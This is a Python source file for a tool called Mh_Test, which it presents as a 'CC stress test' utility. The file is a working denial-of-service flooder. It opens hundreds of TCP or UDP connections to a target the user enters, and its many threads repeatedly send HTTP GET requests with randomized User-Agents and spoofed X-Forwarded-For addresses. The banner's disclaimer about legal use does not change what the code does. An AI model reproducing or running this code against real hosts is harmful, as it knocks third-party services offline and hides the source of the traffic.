import socket,sys,time,os,ctypes
import threading as th
from random import choice,randint
from tqdm import tqdm
version,m1='v0.0.3','(c)Copyrighgt 2025-2026 _MhwsChina_'
useragents=[
    'Java/21.0.3',
    'Python-urllib/2.5',
    'Wget/1.9 cvs-stable (Red Hat modified)',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 Edg/137.0.0.0',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Baiduspider ( http://www.baidu.com/search/spider.htm)',
    'CSSCheck/1.2.2',
    'HTMLParser/1.6',
    'libwww-perl/5.820',
    'Mozilla/3.01Gold (Win95; I)',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
    'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
    'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
    'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
    'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0'
]
accepts=[
    'Accept: */*\r\n',
    'Accept-Encoding: gzip, deflate, br, zstd\r\n',
    'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\n',
    'Accept-Language: en-US,en;q=0.5\r\n'
]
lock,lock1=th.RLock(),th.RLock()
clients=[]
qs,qe=0,0
def fmnum(num):
    tmp,tmp1=0,0
    for a,b in [(1000000000000,'t'),(1000000000,'bn'),(1000000,'m'),(1000,'k')]:
        if num>=a:
            tmp='%.2f'%(num/a)
            tmp1=b
            break
    if not tmp:return num
    return (tmp.replace('.00','') if tmp.endswith('.00') else tmp)+b
def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
    while True:
        tmp=input(txt)
        if not tmp and n:
            return n
        if not tmp in ls and ls!=[]:
            print(err)
            continue
        try:tmp=typ(tmp);break
        except:print(err)
    return tmp
def print(*args,end='\n'):
    txt=' '.join(map(str,[*args]))
    l=0
    for i in txt:
        if ord(i)<=255:l+=1
        else:l+=2
    try:txt=txt+(os.get_terminal_size().columns-l)*' '
    except:txt+='\n'
    sys.stdout.write(txt+end)
def getreq():
    useragent='User-Agent: '+choice(useragents)+'\r\n'
    accept=choice(accepts)
    ipr=f'{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}'
    forward='X-Forwarded-For: '+ipr+'\r\n'
    connection='Connection: Keep-Alive\r\n'
    get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
    req=get_host+useragent+accept+forward+connection+'\r\n'
    return bytes(req,encoding='gbk')
def mht_TCPdefault():
    global clients,qs,qe
    c,c1=th.current_thread().name,0
    req=getreq()
    while 1:
        try:
            with lock:client=clients.pop()
            for j in range(cntt):
                client.sendall(req);qs+=1
            c1+=1
            if c1==10:print(f'\r[+] SENT @ {c}',end='\033[K');c1=0
        except RuntimeError:return
        except Exception as ad:
            try:
                print(f'\r[-] {ad} @ {c}',end='\033[K'+('\n' if debug else ''))
                qe+=1;client=create_tcp_client()
            except:return
        try:clients.append(client)
        except:return
def mht_UDPdefault():
    global clients,qs,qe
    c,c1=th.current_thread().name,0
    req=getreq()
    while 1:
        try:
            with lock:client=clients.pop()
            for j in range(cntt):
                client.sendto(req,(ip,port));qs+=1
            c1+=1
            if c1==10:print(f'\r[+] SENT @ {c}',end='\033[K');c1=0
        except RuntimeError:return
        except Exception as ad:
            try:
                print(f'\r[-] ERROR @ {c} {ad}',end='\033[K'+('\n' if debug else ''))
                qe+=1;client=create_udp_client()
            except:return
        try:clients.append(client)
        except:return
def create_tcp_client():
    ip1=ip.split('/')[0]
    try:
        temp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #端口复用,防止报错
        temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        temp_client.connect((ip1,port))
        return temp_client
    except:return create_tcp_client()
def create_udp_client():
    try:
        temp_client=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return temp_client
    except:return create_udp_client()
def sclient():
    global cns
    while cns:
        try:cns.pop(0)
        except:return
        if udp:clients.append(create_udp_client())
        else:clients.append(create_tcp_client())
        cbar.update(1)
def killthread(target,rtype=RuntimeError):
    tid=ctypes.c_long(target.ident)
    return ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(rtype))
print(' * Mh_Test '+version)
print(' * Code:   https://github.com/MhwsChina/Mh_Test')
print(' * Auther: _MhwsChina_')
print(' * Text:   cc压力测试工具，请勿用于非法用途，仅供学习参考')
print(' * Text:   使用该工具产生的后果作者概不负责')
ip=getln('IP/网址:').replace('http://','').replace('https://','')
page=ip.split('/')
page='/' if len(page)==1 else '/'+'/'.join(page[1:])
ip=ip.split('/')[0]
if ':' in ip:
    ip,port=ip.split(':')
    port=int(port)
else:
    port=getln('PORT/端口:',int,80)
cn=getln('CONNECT/连接数(1000):',int,1000)
thread=getln('THREAD/发包线程(800):',int,800)
cntt=getln('威力[(50=普通)(100=高)(500=极高)]:',int,200)
tm=getln('TIME/攻击持续时间:',int,60)
udp=1 if getln('是否使用UDP连接(Y/[n])',str,'n',['Y','y','N','n']).lower()=='y' else 0
print('创建连接')
cbar=tqdm(total=cn,ascii=True,dynamic_ncols=True)
cns=list(range(cn))
t=[]
for i in range(thread):
    t1=th.Thread(target=sclient,name='create')
    t1.start()
    t.append(t1)
for t1 in t:t1.join()
cbar.close()
print(f'创建了{len(clients)}条连接')
#debug=1 if getln('DEBUG MODE?(Y/[n])',str,'n',['Y','n'])=='Y' else 0
debug=0
print(f'TARGET={ip}:{port},MODE={"udp" if udp else "tcp"}')
lock.acquire();print('启动线程')
t,qss=[],0
for i in range(thread):
    try:
        if udp:t2=mht_UDPdefault
        else:t2=mht_TCPdefault
        t3=th.Thread(target=t2,name=f'attackThread-{i}');t3.start();t.append(t3)
    except:pass
input('按下Enter开始压测');lock.release()
t1=t2=time.time()
while t2-t1<tm:
    try:
        time.sleep(1)
        t2=time.time()
        print('\rsecond',int(t2-t1),'send=',fmnum(qs),'err=',fmnum(qe),'\033[K')
        qss+=qs;qs=0
    except:print('\r提前退出!\033[K');break
print('\r正在清空连接\033[K')
with lock:
    for i in clients:
        try:i.close()
        except:pass
    create_tcp_client=create_udp_client=lambda:None
    del clients,qs,lock
print('\r正在强制关闭线程并等待线程停止\033[K')
while t:
    print(f'\r剩余线程:{len(t)}',end='\033[K')
    killthread(t.pop())
print('\n压测完成')
print(f'压测总时长:{int(t2-t1)}s,请求数:{fmnum(qss)},线程数:{fmnum(thread)},连接数:{fmnum(cn)},请求错误次数:{fmnum(qe)}')
input('按Enter键退出...')
os._exit(0)
